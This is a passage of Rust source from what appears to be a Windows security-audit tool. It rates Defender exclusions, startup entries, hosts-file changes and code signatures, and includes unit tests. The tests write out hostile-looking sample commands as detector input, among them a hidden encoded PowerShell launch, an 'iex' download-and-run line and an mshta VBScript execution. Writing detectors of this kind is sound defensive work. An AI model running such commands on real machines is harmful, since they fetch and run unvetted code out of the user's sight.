            signature: Signature::Unknown,
            reasons: vec![reason],
            detections: Vec::new(),
        });
    };
    for p in &ex.paths {
        let path = Path::new(p);
        let broad = path.parent().is_none() || path.components().count() <= 2 || env.user_writable(path) || lower(path) == lower(&env.windows);
        if broad {
            add("Folder", p, Severity::High, "Defender does not scan this broad or user-writable location at all; malware adds such exclusions to hide".into());
        } else {
            add("Folder", p, Severity::Medium, "Defender does not scan here; make sure you added this yourself".into());
        }
    }
    for p in &ex.processes {
        add("Program", p, Severity::Medium, "Defender ignores what this program does; make sure you added this yourself".into());
    }
    for e in &ex.extensions {
        let risky = matches!(e.trim_start_matches('.').to_ascii_lowercase().as_str(), "exe" | "dll" | "ps1" | "bat" | "cmd" | "vbs" | "js" | "scr" | "com" | "msi");
        add(
            "File type",
            e,
            if risky { Severity::High } else { Severity::Medium },
            if risky { "Defender skips every file of this program or script type".into() } else { "Defender skips every file of this type".into() },
        );
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[cfg(windows)]
    #[test]
    fn collection_script_is_valid_powershell() {
        assert_eq!(crate::system::powershell_syntax_errors(COLLECT_SCRIPT), Vec::<String>::new());
    }

    fn env() -> Env {
        Env {
            vars: vec![("systemroot".into(), r"C:\Windows".into()), ("appdata".into(), r"C:\Users\u\AppData\Roaming".into())],
            windows: PathBuf::from(r"C:\Windows"),
            writable: vec![PathBuf::from(r"C:\Users\u\AppData\Roaming"), PathBuf::from(r"C:\Users\u\AppData\Local\Temp")],
            temp: vec![PathBuf::from(r"C:\Users\u\AppData\Local\Temp")],
        }
    }

    #[test]
    fn command_lines_are_split_into_program_and_arguments() {
        let e = env();
        assert_eq!(e.expand(r"%SystemRoot%\x.exe %UNKNOWN% 50%"), r"C:\Windows\x.exe %UNKNOWN% 50%");
        let (p, a) = split_program(r#""C:\Program Files\App\app.exe" --start -x"#, &e);
        assert_eq!((p.unwrap(), a.as_str()), (PathBuf::from(r"C:\Program Files\App\app.exe"), "--start -x"));
        let (p, a) = split_program(r"C:\Users\u\AppData\Roaming\upd.exe /silent", &e);
        assert_eq!((p.unwrap(), a.as_str()), (PathBuf::from(r"C:\Users\u\AppData\Roaming\upd.exe"), "/silent"));
        assert_eq!(tokens(r#"-File "C:\a b\x.ps1" -y"#), ["-File", r"C:\a b\x.ps1", "-y"]);
    }

    #[test]
    fn script_hosts_running_hidden_or_downloaded_code_are_explained() {
        let r = script_reasons("powershell", "-w hidden -enc SQBFAFgA");
        assert!(r.iter().any(|x| x.contains("encoded")) && r.iter().any(|x| x.contains("hidden window")), "{r:?}");
        let r = script_reasons("powershell", "-c iex (New-Object Net.WebClient).DownloadString('http://x/a')");
        assert!(r.iter().any(|x| x.contains("downloads")), "{r:?}");
        assert!(script_reasons("cmd", "/c echo hi").is_empty());
        assert!(!script_reasons("mshta", "vbscript:Close(Execute(...))").is_empty());
    }

    #[test]
    fn browser_debugging_switches_are_flagged_but_profiles_are_not() {
        assert_eq!(browser_switches("--remote-debugging-port=9222 --user-data-dir=C:\\x"), ["--remote-debugging-port", "--user-data-dir"]);
        assert_eq!(browser_switches("--load-extension=C:\\ext"), ["--load-extension"]);
        assert!(browser_switches("--profile-directory=\"Profile 1\"").is_empty());
        assert!(browser_switches("--user-data-dir=D:\\Work").is_empty(), "a second profile alone is normal");
    }

    #[test]
    fn rating_combines_location_signature_and_detections() {
        let e = env();
        let mut unsigned = item(Kind::StartupEntry, "Updater", "Run", r"C:\Users\u\AppData\Roaming\upd.exe", &e);
        unsigned.program = Some(std::env::current_exe().unwrap()); // an existing file
        unsigned.signature = Signature::Unsigned;
        let exe = unsigned.program.clone().unwrap();
        let writable_env = Env { writable: vec![exe.parent().unwrap().to_path_buf()], ..env() };
        rate(&mut unsigned, &writable_env);
        assert_eq!(unsigned.severity, Severity::Medium, "{:?}", unsigned.reasons);

        let mut signed = item(Kind::StartupEntry, "App", "Run", "x", &e);
        signed.program = Some(exe.clone());
        signed.signature = Signature::Signed { signer: "Contoso".into() };
        rate(&mut signed, &e);
        assert_eq!((signed.severity, signed.reasons.len()), (Severity::Info, 0));

        let mut missing = item(Kind::ScheduledTask, "Old", "Tasks", r"C:\gone\nothing.exe", &e);
        rate(&mut missing, &e);
        assert_eq!(missing.severity, Severity::Low);

        let mut encoded = item(Kind::ScheduledTask, "Sync", "Tasks", "powershell.exe -w hidden -enc AAAA", &e);
        rate(&mut encoded, &e);
        assert_eq!(encoded.severity, Severity::High, "{:?}", encoded.reasons);

        let mut detected = item(Kind::StartupEntry, "Bad", "Run", "x", &e);
        detected.detections.push(Finding {
            threat: "Stealer.Lumma".into(),
            category: crate::Category::Malware,
            source: crate::Source::Yara,
            details: String::new(),
        });
        rate(&mut detected, &e);
        assert_eq!(detected.severity, Severity::High);
        assert!(detected.reasons[0].contains("Stealer.Lumma"));
    }

    #[test]
    fn hosts_entries_for_account_and_security_sites_are_high() {
        let text = "# comment\n127.0.0.1 localhost\n0.0.0.0 ads.example.com\n10.1.2.3 accounts.google.com\n0.0.0.0 www.malwarebytes.com\n192.168.1.5 nas.home\n";
        let found = hosts_findings(text, "hosts");
        let by = |n: &str| found.iter().find(|i| i.title.starts_with(n)).map(|i| i.severity);
        assert_eq!(by("accounts.google.com"), Some(Severity::High));
        assert_eq!(by("www.malwarebytes.com"), Some(Severity::High));
        assert_eq!(by("ads.example.com"), None, "ad blocking is normal");
        assert_eq!(by("nas.home"), Some(Severity::Info));
    }

    #[test]
    fn broad_defender_exclusions_are_high() {
        let ex = DefenderExclusions {
            paths: vec![r"C:\".into(), r"C:\Users\u\AppData\Roaming\Tool".into(), r"D:\Projects\build\out".into()],
            processes: vec!["node.exe".into()],
            extensions: vec![".exe".into(), ".log".into()],
        };
        let items = exclusion_items(&ex, &env());
        let sev = |t: &str| items.iter().find(|i| i.title == t).unwrap_or_else(|| panic!("{t}")).severity;
        assert_eq!(sev(r"Folder excluded: C:\"), Severity::High);
        assert_eq!(sev(r"Folder excluded: C:\Users\u\AppData\Roaming\Tool"), Severity::High);
        assert_eq!(sev(r"Folder excluded: D:\Projects\build\out"), Severity::Medium);
        assert_eq!(sev("Program excluded: node.exe"), Severity::Medium);
        assert_eq!(sev("File type excluded: .exe"), Severity::High);
        assert_eq!(sev("File type excluded: .log"), Severity::Medium);
        let parsed: DefenderExclusions = serde_json::from_str(r#"{"paths":"C:\\x","processes":[],"extensions":null}"#).unwrap();
        assert_eq!(parsed.paths, [r"C:\x"], "PowerShell's one-element arrays");
    }

    #[test]
    fn signer_names_and_states_are_parsed() {
        assert_eq!(signer_name("CN=Google LLC, O=Google LLC, L=Mountain View, C=US"), "Google LLC");
        assert_eq!(signer_name(r#"CN="Valve Corp.", O=Valve"#), "Valve Corp.");
        assert_eq!(parse_signature(&RawSignature { status: "NotSigned".into(), ..Default::default() }), Signature::Unsigned);
        assert!(matches!(parse_signature(&RawSignature { status: "HashMismatch".into(), ..Default::default() }), Signature::Invalid { .. }));
    }
}
